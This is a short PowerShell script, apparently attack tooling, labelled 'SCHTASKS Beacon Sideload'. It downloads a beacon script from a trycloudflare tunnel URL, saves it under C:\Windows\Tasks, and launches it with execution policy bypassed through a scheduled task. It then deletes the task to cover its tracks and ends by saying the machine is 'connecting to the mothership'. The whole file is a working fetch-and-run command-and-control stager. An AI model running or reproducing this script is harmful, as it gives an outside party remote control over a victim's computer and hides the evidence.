param([string]$TunnelUrl = "https://taxes-surprised-immediately-transportation.trycloudflare.com")

Write-Host "=== SCHTASKS Beacon Sideload ==="
Write-Host "Tunnel: $TunnelUrl"

# Step 1: Download beacon script
Write-Host "Step 1: Downloading beacon script..."
$script = (iwr -Uri "$TunnelUrl/beacon-script" -UseBasicParsing).Content
Set-Content C:\Windows\Tasks\beacon.ps1 $script -Encoding UTF8
Write-Host "  Downloaded $($script.Length) bytes"

# Step 2: Create launcher batch file
Write-Host "Step 2: Creating launcher batch..."
Set-Content C:\Windows\Tasks\beacon-launch.bat -Value @"
@echo off
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -ExecutionPolicy Bypass -File C:\Windows\Tasks\beacon.ps1
"@ -Encoding ASCII

# Step 3: Create and run SCHTASKS task
Write-Host "Step 3: Creating SCHTASKS task..."
schtasks /create /tn "BeaconLaunch" /tr "cmd.exe /c C:\Windows\Tasks\beacon-launch.bat" /sc ONCE /st 23:59 /f
if ($LASTEXITCODE -ne 0) { Write-Host "  schtasks /create failed: $LASTEXITCODE" }

Write-Host "Step 4: Running SCHTASKS task..."
schtasks /run /tn "BeaconLaunch"
Start-Sleep -Seconds 2

Write-Host "Step 5: Cleaning up task..."
schtasks /delete /tn "BeaconLaunch" /f

Write-Host "=== Done ==="
Write-Host "A native PowerShell window should now be connecting to the mothership."